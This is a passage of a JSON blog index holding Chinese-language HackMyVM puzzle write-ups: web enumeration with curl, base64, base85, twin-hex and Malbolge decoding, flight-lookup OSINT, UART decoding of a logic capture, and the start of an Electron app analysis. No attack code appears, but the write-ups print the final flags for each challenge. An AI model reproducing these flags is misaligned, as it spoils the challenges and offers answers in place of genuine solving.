"https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P41": {"htmlDir": "docs/post/Challenge 050.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 050", "postUrl": "post/Challenge%20050.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/41", "commentNum": 0, "wordCount": 2929, "description": "![image-20250621131043433](https://7r1umphk.github.io/image/20250621131043717.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/                \nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 21 Jun 2025 05:54:19 GMT\nContent-Type: text/html\nContent-Length: 317\nLast-Modified: Sun, 02 Jun 2024 17:47:47 GMT\nConnection: keep-alive\nETag: '665cb043-13d'\nAccept-Ranges: bytes\n\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n    <meta charset='UTF-8'>\n    <title>HackMyVM - Sertor</title>\n    <link rel='icon' href='logo.png' type='image/png' sizes='16x16'>\n    <link href='index.css' type='text/css' rel='stylesheet'>\n</head>\n<body>\n<p id='smoothkeyset'>\n    THIS LOOKS SO CLEAN!\n</p>\n</body>\n</html>\n \n \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/logo.png                                              \nHTTP/1.1 404 Not Found\nServer: nginx/1.18.0\nDate: Sat, 21 Jun 2025 05:57:21 GMT\nContent-Type: text/html\nContent-Length: 153\nConnection: keep-alive\n\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.18.0</center>\n</body>\n</html>\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/index.css\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 21 Jun 2025 05:57:39 GMT\nContent-Type: text/css\nContent-Length: 451\nLast-Modified: Sun, 02 Jun 2024 17:48:30 GMT\nConnection: keep-alive\nETag: '665cb06e-1c3'\nAccept-Ranges: bytes\n\nbody\n{\n    background: rgb(123, 0, 128);\n    background: linear-gradient(90deg, rgba(123, 0, 128, 1) 0%, rgba(205, 0, 187, 1) 34%, rgba(255, 0, 134, 1) 68%);\n}\n\nbody #smoothkeyset\n{\n    position: absolute;\n    right: 45vw;\n    top: 45vh;\n\n    color: white;\n    font-family: 'Lucida Sans', 'dGhpc2lzbXlrZXkuY3NzLnR4dA==', sans-serif;\n    font-size: large;\n    font-style: italic;\n    text-decoration: white underline solid 6px;\n    cursor: default;\n}\n\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo dGhpc2lzbXlrZXkuY3NzLnR4dA== |base64 -d\nthisismykey.css.txt                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/thisismykey.css.txt\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 21 Jun 2025 05:57:57 GMT\nContent-Type: text/plain\nContent-Length: 20\nLast-Modified: Sun, 02 Jun 2024 17:48:38 GMT\nConnection: keep-alive\nETag: '665cb076-14'\nAccept-Ranges: bytes\n\nHMV{wonderfulltext}\n               \n```\n\nsentence", "top": 0, "createdAt": 1751016594, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P42": {"htmlDir": "docs/post/Challenge 051.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 051", "postUrl": "post/Challenge%20051.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/42", "commentNum": 0, "wordCount": 450, "description": "![image-20250622181457506](https://7r1umphk.github.io/image/20250622181505010.webp)\n\n```\n2zx42j1ji5x05cj64f2lt5zc56a6w0\n```\n\nCyberChef\u8bc6\u522b\u4e0d\u4e86\uff0c\u5c31\u662f\u610f\u601d\u662f\u4e0d\u662f\u5e38\u89c1\u7684\n\ndcode\u662f\u6709\u4e00\u4e2a\u8bc6\u522b\u5bc6\u7801\u7684\u529f\u80fd\u7684\uff0c\u8bd5\u8bd5\n\nhttps://www.dcode.fr/cipher-identifier\n\n![image-20250622182033016](https://7r1umphk.github.io/image/20250622182033489.webp)\n\nhttps://www.dcode.fr/twin-hex-cipher\n\n![image-20250622182054951](https://7r1umphk.github.io/image/20250622182055419.webp)\n\n```\nHMV{4noth3r_C1pher}\n```\n\nsentence", "top": 0, "createdAt": 1751016597, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P43": {"htmlDir": "docs/post/Challenge 052.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 052", "postUrl": "post/Challenge%20052.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/43", "commentNum": 0, "wordCount": 3121, "description": "![image-20250622182158981](https://7r1umphk.github.io/image/20250622182159297.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 052.zip                                                            \nArchive:  052.zip\n extracting: 052.png                 \n  inflating: 052.txt                 \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 052.txt \nGood morning agent X,\nYou have been selected for another important mission.\nYou need to locate a persons flight and the airport were he arrived.\nWe were able to get the date from his cellphone, but it appears encrypted with some sofisticated technique,\nHave a great hunt agent X,\nSh4dowExe\n\nRCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1\n\nP.S.\nWe, also, were able to retrieve this:\n6tmc`F^ZgDA8*0&i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf>1DKU&8+Cf>-+D5_'DBNP&EdD:J%16TYAKYf'+C\\c$FD5<(+CfG7A7]RoASuU$+Co1/Eb0?5D_;\n\nI\u2019m sure that with your capabilities you can solve it.                                                                                                                                                                                   \n```\n\n```\nRCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1\n```\n\n\u6682\u65f6\u770b\u4e0d\u51fa\u6765\u662f\u4ec0\u4e48\uff0c\u6211\u8bd5\u4e86\u4e0bXOR\uff0c\u65e0\u679c\n\n\u7136\u540e\u5c31\u5c1d\u8bd5\u9644\u4ef6\n\n```\n6tmc`F^ZgDA8*0&i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf>1DKU&8+Cf>-+D5_'DBNP&EdD:J%16TYAKYf'+C\\c$FD5<(+CfG7A7]RoASuU$+Co1/Eb0?5D_;\n```\n\n\u662fbase85\n\n![image-20250622205039316](https://7r1umphk.github.io/image/20250622205039860.webp)\n\n```\n\u5728\u8fd9\u8fb9\uff0c\u5728\u90a3\u8fb9\uff0c\u5728\u90a3\u9634\u68ee\u7684\u5ca9\u77f3\u4e0a\uff0c\n\u6211\u770b\u89c1\u957f\u7740\u89d2\u7684\u9b54\u9b3c\uff0c\u624b\u91cc\u62ff\u7740\u5de8\u5927\u7684\u97ad\u5b50\uff0c\n\u5728\u540e\u9762\u6b8b\u5fcd\u5730\u97ad\u6253\u7740\u4ed6\u4eec\u3002\n```\n\n\u8fd9\u6bb5\u6587\u5b57\u51fa\u81ea\u4f46\u4e01\u7684\u300a\u795e\u66f2\u300b\u4e2d\u7684\u300a\u5730\u72f1\u7bc7\u300b\uff0c\u5177\u4f53\u662f\u7b2c\u5341\u516b\u7bc7\u7684\u51e0\u884c\u8bd7\u53e5\u3002\n\n\u540e\u9762\u6252\u62c9\u4e86\u5f88\u4e45\n\n\u7136\u540e\u7ec8\u4e8e\u53d1\u73b0\u4e86\n\n```\nRCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1\n```\n\n\u662fbase64\n\u89e3\u51fa\n\n```\nD'`A^?]\\I;{FWVwS4Qtr0`ooJl7Z''DDBBARaa_u)y[Zvotm3qSi/mleMiha'e^c\\'!_^@\\[TSwW9ONMLpJOHlFKDCg*@d>=B;@?8\\654X816543,P*)Mnm%IH5\n```\n\n\u7136\u540e\u641c\u7d22dante's inferno cipher\uff08\u4ece\u9644\u4ef6\u4e2d\u5f97\u77e5\u7684\u4fe1\u606f\uff09\n\n\u4f60\u80fd\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0\nhttps://bitvijays.github.io/Series_Capture_The_Flag/LFC-Cryptography.html#esoteric-programming-language\n![image-20250622210908861](https://7r1umphk.github.io/image/20250622210909127.webp)\n\n![image-20250622210925792](https://7r1umphk.github.io/image/20250622210926182.webp)\n\n\u6240\u4ee5\u6211\u641c\u7d22\u4e86\u4e00\u4e0b\u8fd9\u79cd\u7f16\u7a0b\n\nhttps://malbolge.doleczek.pl/\n\n\u627e\u5230\u8fd9\u4e2a\n\n\u4e00\u8fd0\u884c\n\n![image-20250622211002462](https://7r1umphk.github.io/image/20250622211002853.webp)\n\n```\n10:11:2023:14:00\n```\n\n\u5f97\u5230\u4e00\u4e2a\u65f6\u95f4\n\n\u7136\u540e\u5c31\u5f80\u524d\u63a8\u4e86\uff0c\u627e\u90a3\u4e2a\u56fe\u7247\u7684\u4fe1\u606f\n\n![052](https://7r1umphk.github.io/image/20250622211439549.webp)\n\n\u52c9\u5f3a\u6062\u590d\u4e86\u4e00\u4e0b\n\n\u76f4\u63a5google\u65e0\u679c\n\n\u770b\u80fd\u4e0d\u80fd\u901a\u8fc7\u65f6\u95f4\u53cd\u63a8\u5427\n\n(\u5c1d\u8bd5\u4e86\u5f88\u4e45\uff0c\u6ca1\u6709\u7ed3\u679c\uff0c\u6682\u65f6\u6401\u7f6e)\n\n\u540e\u9762\u95ee\u4e86\u7fa4\u91cc\u7684\u5927\u4f6c\uff0c\u4ed6\u4eec\u8bf4\u662f\u7eff\u8001\u54e5\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\u627e\u5230\u7684\uff0c\u6211\u4e5f\u6252\u62c9\u4e0d\u5230\u6240\u4ee5\u5148\u62ffflag\u4ea4\u4e86\n\n```\nHVM{Porto-OPO-Eindhoven-EIN-FR7472}\n```\n\n\u95ee\u5230\u4e86\n\nhttps://www.flightera.net/zh/flight/Ryanair-Porto-Eindhoven/FR7472/Oct-2023#flight_list\n\n\u5229\u7528\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u6211\u4e0d\u505a\u4e86\uff0c\u81ea\u5df1\u60f3\u60f3\u601d\u8def\u5427\uff09\n\nsentence", "top": 0, "createdAt": 1751016599, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P44": {"htmlDir": "docs/post/Challenge 20250526.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 20250526", "postUrl": "post/Challenge%2020250526.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/44", "commentNum": 0, "wordCount": 12315, "description": "## \u7b2c\u4e00\u90e8\u5206\uff1a\u5206\u6790 `ezflag` \u6587\u4ef6\n\n### 1. \u521d\u6b65\u6587\u4ef6\u68c0\u67e5\n\n\u4e0b\u8f7d\u6311\u6218\u9644\u4ef6\uff0c\u5f97\u5230\u540d\u4e3a `ezflag` \u7684\u6587\u4ef6\u3002\u9996\u5148\u4f7f\u7528 `file` \u547d\u4ee4\u63a2\u67e5\u5176\u7c7b\u578b\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ file ezflag\nezflag: ASCII text\n```\n\n\u7ed3\u679c\u663e\u793a\u4e3a `ASCII text`\uff0c\u8fd9\u6709\u4e9b\u51fa\u4e4e\u610f\u6599\uff0c\u56e0\u4e3aCTF\u4e2d\u7684flag\u76f8\u5173\u6587\u4ef6\u901a\u5e38\u662f\u4e8c\u8fdb\u5236\u3001\u76f4\u63a5\u5305\u542bflag\u6587\u672c\uff0c\u6216\u8005\u9700\u8981\u7279\u5b9a\u5de5\u5177\u6253\u5f00\u7684\u683c\u5f0f\u3002\u65e2\u7136\u662f\u6587\u672c\u6587\u4ef6\uff0c\u6211\u4eec\u7528 `cat` \u547d\u4ee4\u67e5\u770b\u5176\u5185\u5bb9\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat ezflag\n$timescale 1 us $end\n$var wire 1 ! 0 $end\n$var wire 1 ' 1 $end\n$upscope $end\n$enddefinitions $end\n#0  1! 0'\n#792  0!\n#810  1!\n#826  0!\n#844  1!\n#862  0!\n#870  1!\n#880  0!\n#906  1!\n#922  0!\n#932  1!\n#948  0!\n#958  1!\n#966  0!\n#974  1!\n#984  0!\n#1018  1!\n#1036  0!\n#1044  1!\n#1052  0!\n#1062  1!\n#1088  0!\n#1104  1!\n#1122  0!\n#1132  1!\n#1140  0!\n#1148  1!\n#1166  0!\n#1174  1!\n#1210  0!\n#1218  1!\n#1226  0!\n#1236  1!\n#1244  0!\n#1262  1!\n#1296  0!\n#1304  1!\n#1314  0!\n#1356  1!\n#1374  0!\n#1392  1!\n#1400  0!\n#1410  1!\n#1418  0!\n#1426  1!\n#1436  0!\n#1444  1!\n#1470  0!\n#1478  1!\n#1488  0!\n#1496  1!\n#1540  0!\n#1548  1!\n#1556  0!\n#1566  1!\n#1574  0!\n#1600  1!\n#1608  0!\n#1618  1!\n#1636  0!\n#1652  1!\n#1662  0!\n#1678  1!\n#1688  0!\n#1704  1!\n#1730  0!\n#1740  1!\n#1748  0!\n#1756  1!\n#1774  0!\n#1792  1!\n#1808  0!\n#1826  1!\n#1834  0!\n#1844  1!\n#1888  0!\n#1896  1!\n#1904  0!\n#1914  1!\n#1922  0!\n#1940  1!\n#1948  0!\n#1966  1!\n#1992  0!\n#2000  1!\n#2008  0!\n#2018  1!\n#2034  0!\n#2052  1!\n#2070  0!\n#2086  1!\n#2096  0!\n#2122  1!\n#2130  0!\n#2140  1!\n#2156  0!\n#2174  1!\n#2182  0!\n#2192  1!\n#2200  0!\n#2226  1!\n#2244  0!\n#2260  1!\n#2270  0!\n#2278  1!\n#2286  0!\n#2312  1!\n#2330  0!\n#2348  1!\n#2356  0!\n#2364  1!\n#2374  0!\n#2392  1!\n#2426  0!\n#2434  1!\n#2444  0!\n#2452  1!\n#2496  0!\n#2504  1!\n#2512  0!\n#2522  1!\n#2530  0!\n#2548  1!\n#2564  0!\n#2574  1!\n#2590  0!\n#2608  1!\n#2616  0!\n#2660  1!\n#2678  0!\n#2696  1!\n#2704  0!\n#2748  1!\n#2764  0!\n#2782  1!\n#2790  0!\n#2816  1!\n#2826  0!\n#2842  1!\n#2860  0!\n#2868  1!\n#2878  0!\n#2886  1!\n#2930  0!\n#2938  1!\n#2948  0!\n#2956  1!\n#2964  0!\n#2990  1!\n#3000  0!\n#3008  1!\n#3026  0!\n#3042  1!\n#3052  0!\n#3060  1!\n#3086  0!\n#3094  1!\n#3112  0!\n#3130  1!\n#3138  0!\n#3148  1!\n#3190  0!\n#3200  1!\n#3208  0!\n#3216  1!\n#3226  0!\n#3234  1!\n#3242  0!\n#3268  1!\n#3286  0!\n#3304  1!\n#3312  0!\n#3356  1!\n#3372  0!\n#3390  1!\n#3400  0!\n#3416  1!\n#3434  0!\n#3442  1!\n#3460  0!\n#3478  1!\n#3486  0!\n#3494  1!\n#3504  0!\n#3530  1!\n#3546  0!\n#3564  1!\n#3572  0!\n#3582  1!\n#3598  0!\n#3624  1!\n#3642  0!\n#3652  1!\n#3660  0!\n#3668  1!\n#3712  0!\n#3720  1!\n#3730  0!\n#3738  1!\n#3746  0!\n#3772  1!\n#3782  0!\n#3790  1!\n#3808  0!\n#3824  1!\n#3834  0!\n#3850  1!\n#3878  0!\n#3886  1!\n#3904  0!\n#3912  1!\n#3920  0!\n#3946  1!\n#3956  0!\n#3964  1!\n#3982  0!\n#3998  1!\n#4008  0!\n#4016  1!\n#4024  0!\n#4050  1!\n#4068  0!\n#4086  1!\n#4094  0!\n#4102  1!\n#4112  0!\n#4130  1!\n#4164  0!\n#4172  1!\n#4182  0!\n#4190  1!\n#4198  0!\n#4208  1!\n#4216  0!\n#4224  1!\n#4242  0!\n#4260  1!\n#4268  0!\n#4276  1!\n#4286  0!\n#4312  1!\n#4328  0!\n#4346  1!\n#4354  0!\n#4364  1!\n#4372  0!\n#4380  1!\n#4390  0!\n#4398  1!\n#4416  0!\n#4434  1!\n#4442  0!\n#4450  1!\n#4460  0!\n#4494  1!\n#4502  0!\n#4520  1!\n#4528  0!\n#4538  1!\n#4546  0!\n#4554  1!\n#4598  0!\n#4606  1!\n#4616  0!\n#4634  1!\n#4642  0!\n#4650  1!\n#4660  0!\n#4694  1!\n#5654\n```\n\n### 2. \u7406\u89e3\u6587\u4ef6\u5185\u5bb9\u4e0e\u683c\u5f0f\u8bc6\u522b\n\n\u6587\u4ef6\u5185\u5bb9\u5305\u542b\u4ee5 `$` \u5f00\u5934\u7684\u58f0\u660e\u548c\u4ee5 `#` \u5f00\u5934\u7684\u65f6\u95f4\u6233\u53ca\u4fe1\u53f7\u503c\u53d8\u5316\u3002\u8fd9\u5f3a\u70c8\u6697\u793a\u4e86\u4e00\u79cd\u8bb0\u5f55\u6570\u5b57\u7535\u8def\u4eff\u771f\u6216\u903b\u8f91\u5206\u6790\u4eea\u6355\u83b7\u6570\u636e\u7684\u683c\u5f0f\u3002\n\n#### \u5934\u90e8\u4fe1\u606f\uff1a\n\n-   `$timescale 1 us $end`: \u5b9a\u4e49\u65f6\u95f4\u5355\u4f4d\u4e3a 1 \u5fae\u79d2 (\u00b5s)\u3002\n-   `$var wire 1 ! 0 $end`: \u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a `0` \u76841\u4f4d `wire` (\u5bfc\u7ebf) \u4fe1\u53f7\uff0c\u5176\u5185\u90e8\u6807\u8bc6\u7b26\u4e3a `!`\u3002\n-   `$var wire 1 ' 1 $end`: \u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a `1` (\u6ce8\u610f\u524d\u9762\u6709\u7a7a\u683c) \u76841\u4f4d `wire` \u4fe1\u53f7\uff0c\u5176\u5185\u90e8\u6807\u8bc6\u7b26\u4e3a `'`\u3002\n-   `$upscope $end` \u548c `$enddefinitions $end`: VCD \u6587\u4ef6\u7684\u6807\u51c6\u7ed3\u6784\u3002\n\n#### \u4fe1\u53f7\u6570\u636e\uff1a\n\n-   `#<\u65f6\u95f4\u6233>`: \u8868\u793a\u5728\u8be5\u65f6\u95f4\u70b9\u53d1\u751f\u4fe1\u53f7\u53d8\u5316\u3002\n-   \u4f8b\u5982\uff0c`#0 1! 0'`: \u5728\u65f6\u95f4 0\u00b5s\uff0c\u4fe1\u53f7 `!` (\u5373\u4fe1\u53f7 `0`) \u53d8\u4e3a `1`\uff0c\u4fe1\u53f7 `'` (\u5373\u4fe1\u53f7 `1`) \u53d8\u4e3a `0`\u3002\n-   \u540e\u7eed\u5982 `#792 0!` \u8868\u793a\u4fe1\u53f7 `!` (\u4fe1\u53f7 `0`) \u53d8\u4e3a `0`\uff0c\u4fe1\u53f7 `'` (\u4fe1\u53f7 `1`) \u72b6\u6001\u4fdd\u6301\u4e0d\u53d8\uff0c\u76f4\u5230\u4e0b\u4e00\u6b21\u663e\u5f0f\u66f4\u65b0\u3002\n\n\u901a\u8fc7\u8fd9\u4e9b\u7279\u5f81\uff0c\u53ef\u4ee5\u5224\u65ad\u8be5\u6587\u4ef6\u662f **VCD (Value Change Dump)** \u683c\u5f0f\u3002\u8fd9\u79cd\u6587\u4ef6\u5e38\u7528\u4e8e\u8bb0\u5f55\u6570\u5b57\u903b\u8f91\u4fe1\u53f7\u968f\u65f6\u95f4\u53d8\u5316\u7684\u60c5\u51b5\u3002\n\n### 3. \u4f7f\u7528 PulseView \u89e3\u7801\n\n\u5bf9\u4e8e VCD \u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528\u903b\u8f91\u5206\u6790\u8f6f\u4ef6 PulseView (sigrok \u5957\u4ef6\u7684\u4e00\u90e8\u5206) \u8fdb\u884c\u53ef\u89c6\u5316\u5206\u6790\u548c\u89e3\u7801\u3002\n\n#### \u6b65\u9aa4\u4e00\uff1a\u5bfc\u5165\u6570\u636e\u5230 PulseView\n\n1.  \u542f\u52a8 PulseView\u3002\n2.  \u901a\u8fc7 'File' -> 'Open' (\u6216\u62d6\u62fd) \u6253\u5f00 `ezflag` \u6587\u4ef6\u3002PulseView \u901a\u5e38\u80fd\u81ea\u52a8\u8bc6\u522b VCD \u683c\u5f0f\u3002\u5982\u679c\u9047\u5230\u8bc6\u522b\u95ee\u9898\uff0c\u53ef\u5c1d\u8bd5\u5c06\u6587\u4ef6\u540e\u7f00\u6539\u4e3a `.vcd`\u3002\n\n#### \u6b65\u9aa4\u4e8c\uff1a\u5206\u6790\u6ce2\u5f62\u5e76\u6dfb\u52a0 UART \u89e3\u7801\u5668\n\n\u5bfc\u5165\u540e\uff0c\u4f1a\u770b\u5230\u4e24\u4e2a\u4fe1\u53f7\u901a\u9053\uff0c\u5bf9\u5e94 VCD \u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u4fe1\u53f7 `0` (\u6807\u8bc6\u7b26 `!`) \u548c\u4fe1\u53f7 `1` (\u6807\u8bc6\u7b26 `'`\uff09\u3002\u5728 PulseView \u4e2d\u53ef\u80fd\u663e\u793a\u4e3a D0, D1 \u7b49\u3002\n\n1.  **\u89c2\u5bdf\u6ce2\u5f62\u7279\u5f81\uff1a**\n    \u4ed4\u7ec6\u89c2\u5bdf\u4fe1\u53f7 `!` (\u5728 PulseView \u4e2d\u53ef\u80fd\u662f D0) \u7684\u6ce2\u5f62\u3002\u5b83\u5728 `#0` \u65f6\u523b\u521d\u59cb\u503c\u4e3a `1`\uff0c\u4e4b\u540e\u968f\u65f6\u95f4\u53d1\u751f `0` \u548c `1` \u7684\u8df3\u53d8\u3002\u8fd9\u79cd\u7a7a\u95f2\u65f6\u9ad8\u7535\u5e73 (\u6216\u4f4e\u7535\u5e73)\uff0c\u6570\u636e\u4f20\u8f93\u65f6\u51fa\u73b0\u4e00\u7cfb\u5217\u7535\u5e73\u5feb\u901f\u5207\u6362\u7684\u6a21\u5f0f\uff0c\u975e\u5e38\u7b26\u5408**\u5f02\u6b65\u4e32\u884c\u901a\u4fe1 (UART)** \u7684\u7279\u5f81\u3002\n    *   \u6839\u636e `#0 1! 0'`\uff0c\u4fe1\u53f7 `!` (\u6211\u4eec\u5173\u6ce8\u7684 D0) \u521d\u59cb\u4e3a 1\uff0c\u4fe1\u53f7 `'` \u521d\u59cb\u4e3a 0\u3002\u540e\u7eed\u6570\u636e\u4e3b\u8981\u6539\u53d8\u7684\u662f `!` \u7684\u72b6\u6001\u3002\u56e0\u6b64\uff0c\u4fe1\u53f7 `!` \u6781\u6709\u53ef\u80fd\u662f UART \u7684\u6570\u636e\u7ebf (TX/RX)\u3002\n\n2.  **\u6dfb\u52a0 UART \u89e3\u7801\u5668\uff1a**\n    *   \u70b9\u51fb PulseView \u5de5\u5177\u680f\u4e0a\u7684 'Add Decoder' \u56fe\u6807\u3002\n    *   \u5728\u89e3\u7801\u5668\u5217\u8868\u4e2d\u641c\u7d22\u5e76\u6dfb\u52a0 'UART'\u3002\n\n#### \u6b65\u9aa4\u4e09\uff1a\u914d\u7f6e UART \u89e3\u7801\u5668\n\n\u8fd9\u662f\u89e3\u7801\u6210\u529f\u7684\u5173\u952e\u6b65\u9aa4\u3002\n\n1.  **\u6620\u5c04\u4fe1\u53f7\u7ebf\uff1a**\n    *   \u5c06 UART \u89e3\u7801\u5668\u7684 'TX' (\u6216 'RX') \u5f15\u811a\u8fde\u63a5\u5230\u6211\u4eec\u8ba4\u4e3a\u662f\u6570\u636e\u7ebf\u7684\u901a\u9053\uff0c\u5373\u4ee3\u8868\u4fe1\u53f7 `!` (VCD \u6587\u4ef6\u4e2d\u7684 `0`\uff0cPulseView \u4e2d\u7684 D0) \u7684\u901a\u9053\u3002\n\n2.  **\u786e\u5b9a\u6ce2\u7279\u7387 (Baud Rate)\uff1a**\n    *   \u6ce2\u7279\u7387\u662f UART \u901a\u4fe1\u7684\u6838\u5fc3\u53c2\u6570\u3002\u53ef\u4ee5\u4ece\u5e38\u89c1\u7684\u6ce2\u7279\u7387\u5f00\u59cb\u5c1d\u8bd5\uff0c\u5982 9600, 19200, 38400, 57600, 115200 bps\u3002\n    *   \u5728 PulseView \u4e2d\u4fee\u6539\u89e3\u7801\u5668\u7684\u6ce2\u7279\u7387\u8bbe\u7f6e\uff0c\u89e3\u7801\u7ed3\u679c\u4f1a\u5b9e\u65f6\u66f4\u65b0\u3002\u901a\u8fc7\u89c2\u5bdf\u89e3\u7801\u8f93\u51fa\u662f\u5426\u4e3a\u53ef\u8bfb\u5b57\u7b26\u6216\u6709\u610f\u4e49\u7684\u6570\u636e\u6765\u5224\u65ad\u6ce2\u7279\u7387\u662f\u5426\u6b63\u786e\u3002\n    *   \u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u5f53\u6ce2\u7279\u7387\u8bbe\u7f6e\u4e3a **115200 bps** \u65f6\uff0c\u89e3\u7801\u5668\u8f93\u51fa\u4e86\u4e00\u4e32\u6e05\u6670\u7684 ASCII \u5b57\u7b26\u5e8f\u5217\uff0c\u5e76\u4e14\u6ca1\u6709\u9519\u8bef\u5e27\u3002\n\n3.  **\u5176\u4ed6\u53c2\u6570\uff08\u6570\u636e\u4f4d\u3001\u6821\u9a8c\u4f4d\u3001\u505c\u6b62\u4f4d\uff09\uff1a**\n    *   UART \u901a\u4fe1\u6700\u5e38\u89c1\u7684\u914d\u7f6e\u662f **8 \u4e2a\u6570\u636e\u4f4d (Data bits: 8)**\uff0c**\u65e0\u6821\u9a8c (Parity: None)**\uff0c**1 \u4e2a\u505c\u6b62\u4f4d (Stop bits: 1)**\uff0c\u901a\u5e38\u8868\u793a\u4e3a 8N1\u3002\n    *   \u4f7f\u7528 115200 bps \u6ce2\u7279\u7387\u548c 8N1 \u914d\u7f6e\uff0c\u89e3\u7801\u7ed3\u679c\u826f\u597d\u3002\n\n#### \u6b65\u9aa4\u56db\uff1a\u67e5\u770b\u89e3\u7801\u7ed3\u679c\n\n\u6b63\u786e\u914d\u7f6e\u540e\uff0cPulseView \u4f1a\u5728\u6ce2\u5f62\u4e0b\u65b9\u663e\u793a\u89e3\u7801\u51fa\u7684\u6570\u636e\u3002\n![image-20250526134540784](https://7r1umphk.github.io/image/20250526134541010.webp)\n\n\u5c06\u89e3\u7801\u5b57\u7b26\u62fc\u63a5\uff0c\u5f97\u5230 Flag\uff1a\n`flag{y0u_4r3_r3411y_600d_47_1061c_4n41y515!}`\n\n## \u7b2c\u4e8c\u90e8\u5206\uff1a\u5206\u6790 `ezelectron` \u5e94\u7528\n\n\u4e0b\u8f7d\u5e76\u89e3\u538b `ezelectron-1.1.0-amd64-linux.zip` \u538b\u7f29\u5305\uff0c\u89e3\u538b\u67e5\u770b\u5176\u76ee\u5f55\u7ed3\u6784\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd ezelectron\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/ezelectron]\n\u2514\u2500$ ll\ntotal 242645\ndrwxr-xr-x 1 kali kali      4096 May 26 00:12 .\ndrwxr-xr-x 1 kali kali     12288 May 26 01:57 ..\n-rwxr-xr-x 1 kali kali    147640 May 25 16:22 chrome_100_percent.pak\n-rwxr-xr-x 1 kali kali 196984632 May 25 16:22 ezelectron\ndrwxr-xr-x 1 kali kali      4096 May 26 00:33 